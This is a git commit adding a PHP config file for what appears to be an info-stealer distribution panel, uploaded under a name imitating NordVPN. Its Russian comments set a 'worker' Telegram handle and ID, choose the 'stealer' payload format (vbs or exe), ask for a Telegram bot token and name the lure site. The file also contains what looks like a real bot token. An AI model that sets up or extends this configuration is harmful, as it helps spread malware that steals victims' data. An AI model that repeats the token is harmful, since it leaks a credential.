ca232aebc4dfa017ce97bce2b916454c7d3a986c
nordvpngithub <64992680+nordvpngithub@users.noreply.github.com>
2020-05-11 20:56:03 +0500

    Add files via upload

---
+++ config.php
@@ -0,0 +1,18 @@
+<?php
+
+
+//Телега воркера (пишется через @)
+$worker = "@Vadim4Official";
+
+//Телеграм ид воркера ( с @getmyid_bot)
+$idworkera = "333388711";
+
+//формат стиллера (vbs/exe)
+$format = "exe";
+
+//Создайте бота тут @BotFather и впишите токен бота 
+$bottoken = "1200304954:AAF5dJMslIwjKMZEidM2RawzUjLCE51qTrE";
+
+//Название вашего сайта
+$name = "Mountain";
+?>
